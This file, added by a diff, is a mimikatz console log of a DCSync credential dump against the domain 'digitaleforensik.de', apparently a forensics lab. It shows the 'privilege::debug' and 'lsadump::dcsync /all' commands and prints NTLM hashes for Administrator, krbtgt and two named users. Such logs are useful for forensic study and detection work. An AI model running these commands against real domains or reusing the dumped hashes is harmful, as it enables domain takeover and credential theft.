@@ -1,0 +1,1332 @@
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # lsadump::dcsync /domain:digitaleforensik.de /all
+[DC] 'digitaleforensik.de' will be the domain
+[DC] 'WIN-CS7QONR86QP.digitaleforensik.de' will be the DC server
+[DC] Exporting domain 'digitaleforensik.de'
+
+Object RDN           : digitaleforensik
+
+
+Object RDN           : LostAndFound
+
+
+Object RDN           : Deleted Objects
+
+
+Object RDN           : Users
+
+
+Object RDN           : Computers
+
+
+Object RDN           : System
+
+
+Object RDN           : WinsockServices
+
+
+Object RDN           : RpcServices
+
+
+Object RDN           : FileLinks
+
+
+Object RDN           : VolumeTable
+
+
+Object RDN           : ObjectMoveTable
+
+
+Object RDN           : Default Domain Policy
+
+
+Object RDN           : AppCategories
+
+
+Object RDN           : Meetings
+
+
+Object RDN           : Policies
+
+
+Object RDN           : User
+
+
+Object RDN           : Machine
+
+
+Object RDN           : {6AC1786C-016F-11D2-945F-00C04fB984F9}
+
+
+Object RDN           : User
+
+
+Object RDN           : Machine
+
+
+Object RDN           : RAS and IAS Servers Access Check
+
+
+Object RDN           : File Replication Service
+
+
+Object RDN           : Dfs-Configuration
+
+
+Object RDN           : IP Security
+
+
+Object RDN           : ipsecPolicy{72385230-70FA-11D1-864C-14A300000000}
+
+
+Object RDN           : ipsecISAKMPPolicy{72385231-70FA-11D1-864C-14A300000000}
+
+
+Object RDN           : ipsecNFA{72385232-70FA-11D1-864C-14A300000000}
+
+
+Object RDN           : ipsecNFA{59319BE2-5EE3-11D2-ACE8-0060B0ECCA17}
+
+
+Object RDN           : ipsecNFA{594272E2-071D-11D3-AD22-0060B0ECCA17}
+
+
+Object RDN           : ipsecPolicy{72385236-70FA-11D1-864C-14A300000000}
+
+
+Object RDN           : ipsecISAKMPPolicy{72385237-70FA-11D1-864C-14A300000000}
+
+
+Object RDN           : ipsecNFA{59319C04-5EE3-11D2-ACE8-0060B0ECCA17}
+
+
+Object RDN           : ipsecPolicy{7238523C-70FA-11D1-864C-14A300000000}
+
+
+Object RDN           : ipsecISAKMPPolicy{7238523D-70FA-11D1-864C-14A300000000}
+
+
+Object RDN           : ipsecNFA{7238523E-70FA-11D1-864C-14A300000000}
+
+
+Object RDN           : ipsecNFA{59319BF3-5EE3-11D2-ACE8-0060B0ECCA17}
+
+
+Object RDN           : ipsecNFA{6A1F5C6F-72B7-11D2-ACF0-0060B0ECCA17}
+
+
+Object RDN           : ipsecNFA{594272FD-071D-11D3-AD22-0060B0ECCA17}
+
+
+Object RDN           : ipsecNegotiationPolicy{59319BDF-5EE3-11D2-ACE8-0060B0ECCA17}
+
+
+Object RDN           : ipsecNegotiationPolicy{59319BF0-5EE3-11D2-ACE8-0060B0ECCA17}
+
+
+Object RDN           : ipsecNegotiationPolicy{59319C01-5EE3-11D2-ACE8-0060B0ECCA17}
+
+
+Object RDN           : ipsecNegotiationPolicy{72385233-70FA-11D1-864C-14A300000000}
+
+
+Object RDN           : ipsecNegotiationPolicy{7238523F-70FA-11D1-864C-14A300000000}
+
+
+Object RDN           : ipsecNegotiationPolicy{7238523B-70FA-11D1-864C-14A300000000}
+
+
+Object RDN           : ipsecFilter{7238523A-70FA-11D1-864C-14A300000000}
+
+
+Object RDN           : ipsecFilter{72385235-70FA-11D1-864C-14A300000000}
+
+
+Object RDN           : ComPartitions
+
+
+Object RDN           : ComPartitionSets
+
+
+Object RDN           : WMIPolicy
+
+
+Object RDN           : PolicyTemplate
+
+
+Object RDN           : SOM
+
+
+Object RDN           : PolicyType
+
+
+Object RDN           : WMIGPO
+
+
+Object RDN           : DomainUpdates
+
+
+Object RDN           : Operations
+
+
+Object RDN           : ab402345-d3c3-455d-9ff7-40268a1099b6
+
+
+Object RDN           : bab5f54d-06c8-48de-9b87-d78b796564e4
+
+
+Object RDN           : f3dd09dd-25e8-4f9c-85df-12d6d2f2f2f5
+
+
+Object RDN           : 2416c60a-fe15-4d7a-a61e-dffd5df864d3
+
+
+Object RDN           : 7868d4c8-ac41-4e05-b401-776280e8e9f1
+
+
+Object RDN           : 860c36ed-5241-4c62-a18b-cf6ff9994173
+
+
+Object RDN           : 0e660ea3-8a5e-4495-9ad7-ca1bd4638f9e
+
+
+Object RDN           : a86fe12a-0f62-4e2a-b271-d27f601f8182
+
+
+Object RDN           : d85c0bfd-094f-4cad-a2b5-82ac9268475d
+
+
+Object RDN           : 6ada9ff7-c9df-45c1-908e-9fef2fab008a
+
+
+Object RDN           : 10b3ad2a-6883-4fa7-90fc-6377cbdc1b26
+
+
+Object RDN           : 98de1d3e-6611-443b-8b4e-f4337f1ded0b
+
+
+Object RDN           : f607fd87-80cf-45e2-890b-6cf97ec0e284
+
+
+Object RDN           : 9cac1f66-2167-47ad-a472-2a13251310e4
+
+
+Object RDN           : 6ff880d6-11e7-4ed1-a20f-aac45da48650
+
+
+Object RDN           : 446f24ea-cfd5-4c52-8346-96e170bcb912
+
+
+Object RDN           : 51cba88b-99cf-4e16-bef2-c427b38d0767
+
+
+Object RDN           : a3dac986-80e7-4e59-a059-54cb1ab43cb9
+
+
+Object RDN           : 293f0798-ea5c-4455-9f5d-45f33a30703b
+
+
+Object RDN           : 5c82b233-75fc-41b3-ac71-c69592e6bf15
+
+
+Object RDN           : 7ffef925-405b-440a-8d58-35e8cd6e98c3
+
+
+Object RDN           : 4dfbb973-8a62-4310-a90c-776e00f83222
+
+
+Object RDN           : 8437C3D8-7689-4200-BF38-79E4AC33DFA0
+
+
+Object RDN           : 7cfb016c-4f87-4406-8166-bd9df943947f
+
+
+Object RDN           : f7ed4553-d82b-49ef-a839-2f38a36bb069
+
+
+Object RDN           : 8ca38317-13a4-4bd4-806f-ebed6acb5d0c
+
+
+Object RDN           : 3c784009-1f57-4e2a-9b04-6915c9e71961
+
+
+Object RDN           : 6bcd5678-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd5679-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd567a-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd567b-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd567c-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd567d-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd567e-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd567f-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd5680-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd5681-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd5682-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd5683-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd5684-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd5685-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd5686-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd5687-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd5688-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd5689-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd568a-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd568b-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd568c-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd568d-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 3051c66f-b332-4a73-9a20-2d6a7d6e6a1c
+
+
+Object RDN           : 3e4f4182-ac5d-4378-b760-0eab2de593e2
+
+
+Object RDN           : c4f17608-e611-11d6-9793-00c04f613221
+
+
+Object RDN           : 13d15cf0-e6c8-11d6-9793-00c04f613221
+
+
+Object RDN           : 8ddf6913-1c7b-4c59-a5af-b9ca3b3d2c4c
+
+
+Object RDN           : dda1d01d-4bd7-4c49-a184-46f9241b560e
+
+
+Object RDN           : a1789bfb-e0a2-4739-8cc0-e77d892d080a
+
+
+Object RDN           : 61b34cb0-55ee-4be9-b595-97810b92b017
+
+
+Object RDN           : 57428d75-bef7-43e1-938b-2e749f5a8d56
+
+
+Object RDN           : ebad865a-d649-416f-9922-456b53bbb5b8
+
+
+Object RDN           : 0b7fb422-3609-4587-8c2e-94b10f67d1bf
+
+
+Object RDN           : 2951353e-d102-4ea5-906c-54247eeec741
+
+
+Object RDN           : 71482d49-8870-4cb3-a438-b6fc9ec35d70
+
+
+Object RDN           : aed72870-bf16-4788-8ac7-22299c8207f1
+
+
+Object RDN           : f58300d1-b71a-4DB6-88a1-a8b9538beaca
+
+
+Object RDN           : 231fb90b-c92a-40c9-9379-bacfc313a3e3
+
+
+Object RDN           : 4aaabc3a-c416-4b9c-a6bb-4b453ab1c1f0
+
+
+Object RDN           : 9738c400-7795-4d6e-b19d-c16cd6486166
+
+
+Object RDN           : de10d491-909f-4fb0-9abb-4b7865c0fe80
+
+
+Object RDN           : b96ed344-545a-4172-aa0c-68118202f125
+
+
+Object RDN           : 4c93ad42-178a-4275-8600-16811d28f3aa
+
+
+Object RDN           : c88227bc-fcca-4b58-8d8a-cd3d64528a02
+
+
+Object RDN           : 5e1574f6-55df-493e-a671-aaeffca6a100
+
+
+Object RDN           : d262aae8-41f7-48ed-9f35-56bbb677573d
+
+
+Object RDN           : 82112ba0-7e4c-4a44-89d9-d46c9612bf91
+
+
+Object RDN           : c3c927a6-cc1d-47c0-966b-be8f9b63d991
+
+
+Object RDN           : 54afcfb9-637a-4251-9f47-4d50e7021211
+
+
+Object RDN           : f4728883-84dd-483c-9897-274f2ebcf11e
+
+
+Object RDN           : ff4f9d27-7157-4cb0-80a9-5d6f2b14c8ff
+
+
+Object RDN           : 83C53DA7-427E-47A4-A07A-A324598B88F7
+
+
+Object RDN           : C81FC9CC-0130-4FD1-B272-634D74818133
+
+
+Object RDN           : E5F9E791-D96D-4FC9-93C9-D53E1DC439BA
+
+
+Object RDN           : e6d5fd00-385d-4e65-b02d-9da3493ed850
+
+
+Object RDN           : 3a6b3fbf-3168-4312-a10d-dd5b3393952d
+
+
+Object RDN           : 7F950403-0AB3-47F9-9730-5D7B0269F9BD
+
+
+Object RDN           : 434bb40d-dbc9-4fe7-81d4-d57229f7b080
+
+
+Object RDN           : A0C238BA-9E30-4EE6-80A6-43F731E9A5CD
+
+
+Object RDN           : Windows2003Update
+
+
+Object RDN           : ActiveDirectoryUpdate
+
+
+Object RDN           : Password Settings Container
+
+
+Object RDN           : PSPs
+
+
+Object RDN           : Domain Controllers
+
+
+Object RDN           : Infrastructure
+
+
+Object RDN           : ForeignSecurityPrincipals
+
+
+Object RDN           : Program Data
+
+
+Object RDN           : Microsoft
+
+
+Object RDN           : NTDS Quotas
+
+
+Object RDN           : Managed Service Accounts
+
+
+Object RDN           : TPM Devices
+
+
+Object RDN           : Keys
+
+
+Object RDN           : Gast
+
+** SAM ACCOUNT **
+
+SAM Username         : Gast
+User Account Control : 00010222 ( ACCOUNTDISABLE PASSWD_NOTREQD NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Object Security ID   : S-1-5-21-2157391606-1843640176-3128955156-501
+Object Relative ID   : 501
+
+Credentials:
+
+Object RDN           : Builtin
+
+
+Object RDN           : S-1-5-4
+
+
+Object RDN           : S-1-5-11
+
+
+Object RDN           : Remotedesktopbenutzer
+
+** SAM ACCOUNT **
+
+SAM Username         : Remotedesktopbenutzer
+Object Security ID   : S-1-5-32-555
+Object Relative ID   : 555
+
+Credentials:
+
+Object RDN           : Netzwerkkonfigurations-Operatoren
+
+** SAM ACCOUNT **
+
+SAM Username         : Netzwerkkonfigurations-Operatoren
+Object Security ID   : S-1-5-32-556
+Object Relative ID   : 556
+
+Credentials:
+
+Object RDN           : Leistungsüberwachungsbenutzer
+
+** SAM ACCOUNT **
+
+SAM Username         : Leistungsüberwachungsbenutzer
+Object Security ID   : S-1-5-32-558
+Object Relative ID   : 558
+
+Credentials:
+
+Object RDN           : Leistungsprotokollbenutzer
+
+** SAM ACCOUNT **
+
+SAM Username         : Leistungsprotokollbenutzer
+Object Security ID   : S-1-5-32-559
+Object Relative ID   : 559
+
+Credentials:
+
+Object RDN           : Distributed COM-Benutzer
+
+** SAM ACCOUNT **
+
+SAM Username         : Distributed COM-Benutzer
+Object Security ID   : S-1-5-32-562
+Object Relative ID   : 562
+
+Credentials:
+
+Object RDN           : S-1-5-17
+
+
+Object RDN           : IIS_IUSRS
+
+** SAM ACCOUNT **
+
+SAM Username         : IIS_IUSRS
+Object Security ID   : S-1-5-32-568
+Object Relative ID   : 568
+
+Credentials:
+
+Object RDN           : Kryptografie-Operatoren
+
+** SAM ACCOUNT **
+
+SAM Username         : Kryptografie-Operatoren
+Object Security ID   : S-1-5-32-569
+Object Relative ID   : 569
+
+Credentials:
+
+Object RDN           : Ereignisprotokollleser
+
+** SAM ACCOUNT **
+
+SAM Username         : Ereignisprotokollleser
+Object Security ID   : S-1-5-32-573
+Object Relative ID   : 573
+
+Credentials:
+
+Object RDN           : Zertifikatdienst-DCOM-Zugriff
+
+** SAM ACCOUNT **
+
+SAM Username         : Zertifikatdienst-DCOM-Zugriff
+Object Security ID   : S-1-5-32-574
+Object Relative ID   : 574
+
+Credentials:
+
+Object RDN           : RDS-Remotezugriffsserver
+
+** SAM ACCOUNT **
+
+SAM Username         : RDS-Remotezugriffsserver
+Object Security ID   : S-1-5-32-575
+Object Relative ID   : 575
+
+Credentials:
+
+Object RDN           : RDS-Endpunktserver
+
+** SAM ACCOUNT **
+
+SAM Username         : RDS-Endpunktserver
+Object Security ID   : S-1-5-32-576
+Object Relative ID   : 576
+
+Credentials:
+
+Object RDN           : RDS-Verwaltungsserver
+
+** SAM ACCOUNT **
+
+SAM Username         : RDS-Verwaltungsserver
+Object Security ID   : S-1-5-32-577
+Object Relative ID   : 577
+
+Credentials:
+
+Object RDN           : Hyper-V-Administratoren
+
+** SAM ACCOUNT **
+
+SAM Username         : Hyper-V-Administratoren
+Object Security ID   : S-1-5-32-578
+Object Relative ID   : 578
+
+Credentials:
+
+Object RDN           : Zugriffssteuerungs-Unterstützungsoperatoren
+
+** SAM ACCOUNT **
+
+SAM Username         : Zugriffssteuerungs-Unterstützungsoperatoren
+Object Security ID   : S-1-5-32-579
+Object Relative ID   : 579
+
+Credentials:
+
+Object RDN           : Remoteverwaltungsbenutzer
+
+** SAM ACCOUNT **
+
+SAM Username         : Remoteverwaltungsbenutzer
+Object Security ID   : S-1-5-32-580
+Object Relative ID   : 580
+
+Credentials:
+
+Object RDN           : Storage Repl. Admin
+
+** SAM ACCOUNT **
+
+SAM Username         : Storage Repl. Admin
+Object Security ID   : S-1-5-32-582
+Object Relative ID   : 582
+
+Credentials:
+
+Object RDN           : Domänencomputer
+
+** SAM ACCOUNT **
+
+SAM Username         : Domänencomputer
+Object Security ID   : S-1-5-21-2157391606-1843640176-3128955156-515
+Object Relative ID   : 515
+
+Credentials:
+
+Object RDN           : Zertifikatherausgeber
+
+** SAM ACCOUNT **
+
+SAM Username         : Zertifikatherausgeber
+Object Security ID   : S-1-5-21-2157391606-1843640176-3128955156-517
+Object Relative ID   : 517
+
+Credentials:
+
+Object RDN           : Domänen-Benutzer
+
+** SAM ACCOUNT **
+
+SAM Username         : Domänen-Benutzer
+Object Security ID   : S-1-5-21-2157391606-1843640176-3128955156-513
+Object Relative ID   : 513
+
+Credentials:
+
+Object RDN           : Domänen-Gäste
+
+** SAM ACCOUNT **
+
+SAM Username         : Domänen-Gäste
+Object Security ID   : S-1-5-21-2157391606-1843640176-3128955156-514
+Object Relative ID   : 514
+
+Credentials:
+
+Object RDN           : RAS- und IAS-Server
+
+** SAM ACCOUNT **
+
+SAM Username         : RAS- und IAS-Server
+Object Security ID   : S-1-5-21-2157391606-1843640176-3128955156-553
+Object Relative ID   : 553
+
+Credentials:
+
+Object RDN           : Erstellungen eingehender Gesamtstrukturvertrauensstellung
+
+** SAM ACCOUNT **
+
+SAM Username         : Erstellungen eingehender Gesamtstrukturvertrauensstellung
+Object Security ID   : S-1-5-32-557
+Object Relative ID   : 557
+
+Credentials:
+
+Object RDN           : Terminalserver-Lizenzserver
+
+** SAM ACCOUNT **
+
+SAM Username         : Terminalserver-Lizenzserver
+Object Security ID   : S-1-5-32-561
+Object Relative ID   : 561
+
+Credentials:
+
+Object RDN           : Benutzer
+
+** SAM ACCOUNT **
+
+SAM Username         : Benutzer
+Object Security ID   : S-1-5-32-545
+Object Relative ID   : 545
+
+Credentials:
+
+Object RDN           : Gäste
+
+** SAM ACCOUNT **
+
+SAM Username         : Gäste
+Object Security ID   : S-1-5-32-546
+Object Relative ID   : 546
+
+Credentials:
+
+Object RDN           : Richtlinien-Ersteller-Besitzer
+
+** SAM ACCOUNT **
+
+SAM Username         : Richtlinien-Ersteller-Besitzer
+Object Security ID   : S-1-5-21-2157391606-1843640176-3128955156-520
+Object Relative ID   : 520
+
+Credentials:
+
+Object RDN           : Prä-Windows 2000 kompatibler Zugriff
+
+** SAM ACCOUNT **
+
+SAM Username         : Prä-Windows 2000 kompatibler Zugriff
+Object Security ID   : S-1-5-32-554
+Object Relative ID   : 554
+
+Credentials:
+
+Object RDN           : S-1-5-9
+
+
+Object RDN           : Windows-Autorisierungszugriffsgruppe
+
+** SAM ACCOUNT **
+
+SAM Username         : Windows-Autorisierungszugriffsgruppe
+Object Security ID   : S-1-5-32-560
+Object Relative ID   : 560
+
+Credentials:
+
+Object RDN           : 6E157EDF-4E72-4052-A82A-EC3F91021A22
+
+
+Object RDN           : Zulässige RODC-Kennwortreplikationsgruppe
+
+** SAM ACCOUNT **
+
+SAM Username         : Zulässige RODC-Kennwortreplikationsgruppe
+Object Security ID   : S-1-5-21-2157391606-1843640176-3128955156-571
+Object Relative ID   : 571
+
+Credentials:
+
+Object RDN           : Schreibgeschützte Domänencontroller der Organisation
+
+** SAM ACCOUNT **
+
+SAM Username         : Schreibgeschützte Domänencontroller der Organisation
+Object Security ID   : S-1-5-21-2157391606-1843640176-3128955156-498
+Object Relative ID   : 498
+
+Credentials:
+
+Object RDN           : Abgelehnte RODC-Kennwortreplikationsgruppe
+
+** SAM ACCOUNT **
+
+SAM Username         : Abgelehnte RODC-Kennwortreplikationsgruppe
+Object Security ID   : S-1-5-21-2157391606-1843640176-3128955156-572
+Object Relative ID   : 572
+
+Credentials:
+
+Object RDN           : Klonbare Domänencontroller
+
+** SAM ACCOUNT **
+
+SAM Username         : Klonbare Domänencontroller
+Object Security ID   : S-1-5-21-2157391606-1843640176-3128955156-522
+Object Relative ID   : 522
+
+Credentials:
+
+Object RDN           : Protected Users
+
+** SAM ACCOUNT **
+
+SAM Username         : Protected Users
+Object Security ID   : S-1-5-21-2157391606-1843640176-3128955156-525
+Object Relative ID   : 525
+
+Credentials:
+
+Object RDN           : DnsAdmins
+
+** SAM ACCOUNT **
+
+SAM Username         : DnsAdmins
+Object Security ID   : S-1-5-21-2157391606-1843640176-3128955156-1101
+Object Relative ID   : 1101
+
+Credentials:
+
+Object RDN           : DnsUpdateProxy
+
+** SAM ACCOUNT **
+
+SAM Username         : DnsUpdateProxy
+Object Security ID   : S-1-5-21-2157391606-1843640176-3128955156-1102
+Object Relative ID   : 1102
+
+Credentials:
+
+Object RDN           : MicrosoftDNS
+
+
+Object RDN           : RootDNSServers
+
+
+Object RDN           : @
+
+
+Object RDN           : d.root-servers.net
+
+
+Object RDN           : e.root-servers.net
+
+
+Object RDN           : f.root-servers.net
+
+
+Object RDN           : g.root-servers.net
+
+
+Object RDN           : h.root-servers.net
+
+
+Object RDN           : i.root-servers.net
+
+
+Object RDN           : j.root-servers.net
+
+
+Object RDN           : k.root-servers.net
+
+
+Object RDN           : l.root-servers.net
+
+
+Object RDN           : m.root-servers.net
+
+
+Object RDN           : a.root-servers.net
+
+
+Object RDN           : b.root-servers.net
+
+
+Object RDN           : c.root-servers.net
+
+
+Object RDN           : Server
+
+
+Object RDN           : DFSR-GlobalSettings
+
+
+Object RDN           : Domain System Volume
+
+
+Object RDN           : Content
+
+
+Object RDN           : SYSVOL Share
+
+
+Object RDN           : Topology
+
+
+Object RDN           : WIN-CS7QONR86QP
+
+
+Object RDN           : Domain System Volume
+
+
+Object RDN           : {31B2F340-016D-11D2-945F-00C04FB984F9}
+
+
+Object RDN           : gc
+DEL:58730cb2-3445-4d2a-8c24-621ac89f6bb6
+
+
+Object RDN           : 461bf233-175c-48cf-8cec-1ecbb1bc2e45
+DEL:230e9875-8b85-4c43-883f-ce0bf14a041a
+
+
+Object RDN           : _ldap._tcp.pdc
+DEL:e432932c-3a10-48bd-938b-510d56f1c563
+
+
+Object RDN           : _ldap._tcp.gc
+DEL:21825ae9-bd3e-4031-b04c-8fe08ee3456c
+
+
+Object RDN           : _ldap._tcp.Default-First-Site-Name._sites.gc
+DEL:ff0fadf4-c58a-4e99-a7e1-a36d69110ca5
+
+
+Object RDN           : _ldap._tcp.Default-First-Site-Name._sites.dc
+DEL:d0752674-71e2-44d9-9000-d718a95b168d
+
+
+Object RDN           : _ldap._tcp.dc
+DEL:a8372fa4-b440-4f13-8234-929040529389
+
+
+Object RDN           : _ldap._tcp.1807c89e-efc3-4ff8-a424-3259d698edc1.domains
+DEL:bb878d22-fd91-4e8f-b6b1-e9ae2de4715f
+
+
+Object RDN           : _kerberos._tcp.Default-First-Site-Name._sites.dc
+DEL:879a9a74-48bd-41a4-855d-a8f2cffd27b6
+
+
+Object RDN           : _kerberos._tcp.dc
+DEL:0decb61d-87ae-434c-bc23-8ad5f42455bf
+
+
+Object RDN           : @
+DEL:ee4670ba-e1c4-46a8-9d84-f427076ba037
+
+
+Object RDN           : ..Deleted-_msdcs.digitaleforensik.de
+DEL:b7d782e8-44ef-4aba-9b79-6cd897da2c0c
+
+
+Object RDN           : win-cs7qonr86qp
+DEL:009eee2d-360a-4d3d-8b06-fde8bbf16745
+
+
+Object RDN           : ForestDnsZones
+DEL:66420b9b-cd94-420a-8727-f3fb370a9c6e
+
+
+Object RDN           : DomainDnsZones
+DEL:526d14a6-94d2-45b1-8cc3-df00f7ed6a84
+
+
+Object RDN           : _msdcs
+DEL:3accbb75-04a7-4144-ab14-d659ba792dd9
+
+
+Object RDN           : _ldap._tcp.ForestDnsZones
+DEL:3d4adc76-7fa7-4e6a-92c5-08dad650ebb7
+
+
+Object RDN           : _ldap._tcp.DomainDnsZones
+DEL:a88abb56-7090-43e7-80f5-5e12cedbf870
+
+
+Object RDN           : _ldap._tcp.Default-First-Site-Name._sites.ForestDnsZones
+DEL:af5b8928-d17e-467a-a4b6-cbc94cecfbd2
+
+
+Object RDN           : _ldap._tcp.Default-First-Site-Name._sites.DomainDnsZones
+DEL:68d22b65-8038-4303-95bd-9e70966b0b9b
+
+
+Object RDN           : _ldap._tcp.Default-First-Site-Name._sites
+DEL:2892af52-8f46-48d0-8fb9-4aeb53bc3d0f
+
+
+Object RDN           : _ldap._tcp
+DEL:60e3d0eb-a5d2-4626-b090-0797ae32d214
+
+
+Object RDN           : _kpasswd._udp
+DEL:2c1b8b92-0c7e-4ba3-a208-d5ee03e5e700
+
+
+Object RDN           : _kpasswd._tcp
+DEL:245d70fe-d43b-408c-907a-3894f477e750
+
+
+Object RDN           : _kerberos._udp
+DEL:fc68251f-072c-400f-92ed-0c174bc94a1a
+
+
+Object RDN           : _kerberos._tcp.Default-First-Site-Name._sites
+DEL:817b2726-16e2-4996-bbf2-894e594d47de
+
+
+Object RDN           : _kerberos._tcp
+DEL:3bbee8b7-5263-49a2-93a3-2ea2c741938b
+
+
+Object RDN           : _gc._tcp.Default-First-Site-Name._sites
+DEL:89a93963-bdef-41a2-b988-3effcb45ca5c
+
+
+Object RDN           : _gc._tcp
+DEL:d4be8b88-98dc-46d9-8f94-31230391b5d1
+
+
+Object RDN           : @
+DEL:bb692c93-d5f5-4135-872b-5a15667c2a1a
+
+
+Object RDN           : ..Deleted-digitaleforensik.de
+DEL:5ff4ee7a-67dc-497d-8baa-ad513880b8ec
+
+
+Object RDN           : DFSR-LocalSettings
+
+
+Object RDN           : SYSVOL Subscription
+
+
+Object RDN           : AdminSDHolder
+
+
+Object RDN           : Schema-Admins
+
+** SAM ACCOUNT **
+
+SAM Username         : Schema-Admins
+Object Security ID   : S-1-5-21-2157391606-1843640176-3128955156-518
+Object Relative ID   : 518
+
+Credentials:
+
+Object RDN           : Domänen-Admins
+
+** SAM ACCOUNT **
+
+SAM Username         : Domänen-Admins
+Object Security ID   : S-1-5-21-2157391606-1843640176-3128955156-512
+Object Relative ID   : 512
+
+Credentials:
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrator
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Object Security ID   : S-1-5-21-2157391606-1843640176-3128955156-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: 024ac06ed924324b9d2c647e72f64d30
+
+Object RDN           : Schlüsseladministratoren
+
+** SAM ACCOUNT **
+
+SAM Username         : Schlüsseladministratoren
+Object Security ID   : S-1-5-21-2157391606-1843640176-3128955156-526
+Object Relative ID   : 526
+
+Credentials:
+
+Object RDN           : Organisations-Admins
+
+** SAM ACCOUNT **
+
+SAM Username         : Organisations-Admins
+Object Security ID   : S-1-5-21-2157391606-1843640176-3128955156-519
+Object Relative ID   : 519
+
+Credentials:
+
+Object RDN           : Unternehmenssschlüsseladministratoren
+
+** SAM ACCOUNT **
+
+SAM Username         : Unternehmenssschlüsseladministratoren
+Object Security ID   : S-1-5-21-2157391606-1843640176-3128955156-527
+Object Relative ID   : 527
+
+Credentials:
+
+Object RDN           : Server-Operatoren
+
+** SAM ACCOUNT **
+
+SAM Username         : Server-Operatoren
+Object Security ID   : S-1-5-32-549
+Object Relative ID   : 549
+
+Credentials:
+
+Object RDN           : Sicherungs-Operatoren
+
+** SAM ACCOUNT **
+
+SAM Username         : Sicherungs-Operatoren
+Object Security ID   : S-1-5-32-551
+Object Relative ID   : 551
+
+Credentials:
+
+Object RDN           : Druck-Operatoren
+
+** SAM ACCOUNT **
+
+SAM Username         : Druck-Operatoren
+Object Security ID   : S-1-5-32-550
+Object Relative ID   : 550
+
+Credentials:
+
+Object RDN           : Konten-Operatoren
+
+** SAM ACCOUNT **
+
+SAM Username         : Konten-Operatoren
+Object Security ID   : S-1-5-32-548
+Object Relative ID   : 548
+
+Credentials:
+
+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Object Security ID   : S-1-5-21-2157391606-1843640176-3128955156-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 2b04f653885770e44ee0c176775dd60a
+
+Object RDN           : Domänencontroller
+
+** SAM ACCOUNT **
+
+SAM Username         : Domänencontroller
+Object Security ID   : S-1-5-21-2157391606-1843640176-3128955156-516
+Object Relative ID   : 516
+
+Credentials:
+
+Object RDN           : Schreibgeschützte Domänencontroller
+
+** SAM ACCOUNT **
+
+SAM Username         : Schreibgeschützte Domänencontroller
+Object Security ID   : S-1-5-21-2157391606-1843640176-3128955156-521
+Object Relative ID   : 521
+
+Credentials:
+
+Object RDN           : Florian FH. Hagengruber
+DEL:192d5e79-68f9-473d-a3d3-5cb14a68d478
+
+** SAM ACCOUNT **
+
+SAM Username         : f.hagengruber
+User Account Control : 00000222 ( ACCOUNTDISABLE PASSWD_NOTREQD NORMAL_ACCOUNT )
+Object Security ID   : S-1-5-21-2157391606-1843640176-3128955156-1104
+Object Relative ID   : 1104
+
+Credentials:
+
+Object RDN           : BCKUPKEY_83da1d8b-1d98-4bd7-805c-c7e706d179e5 Secret
+
+
+Object RDN           : BCKUPKEY_P Secret
+
+
+Object RDN           : BCKUPKEY_b680dd5a-4961-4026-8df1-368edd1d5d0f Secret
+
+
+Object RDN           : BCKUPKEY_PREFERRED Secret
+
+
+Object RDN           : Bianca Hegner
+
+** SAM ACCOUNT **
+
+SAM Username         : b.hegner
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Object Security ID   : S-1-5-21-2157391606-1843640176-3128955156-1107
+Object Relative ID   : 1107
+
+Credentials:
+  Hash NTLM: 5a883a8773854d53c76d571749c9d3bd
+
+Object RDN           : Configuration
+
+
+Object RDN           : DomainDnsZones
+
+
+Object RDN           : ForestDnsZones
+
+
+Object RDN           : Replikations-Operator
+
+** SAM ACCOUNT **
+
+SAM Username         : Replikations-Operator
+Object Security ID   : S-1-5-32-552
+Object Relative ID   : 552
+
+Credentials:
+
+Object RDN           : Administratoren
+
+** SAM ACCOUNT **
+
+SAM Username         : Administratoren
+Object Security ID   : S-1-5-32-544
+Object Relative ID   : 544
+
+Credentials:
+
+Object RDN           : RID Manager$
+
+
+Object RDN           : RID Set
+
+
+Object RDN           : Martin MW. Wallinger
+
+** SAM ACCOUNT **
+
+SAM Username         : m.wallinger
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Object Security ID   : S-1-5-21-2157391606-1843640176-3128955156-1108
+Object Relative ID   : 1108
+
+Credentials:
+  Hash NTLM: 5a883a8773854d53c76d571749c9d3bd
+
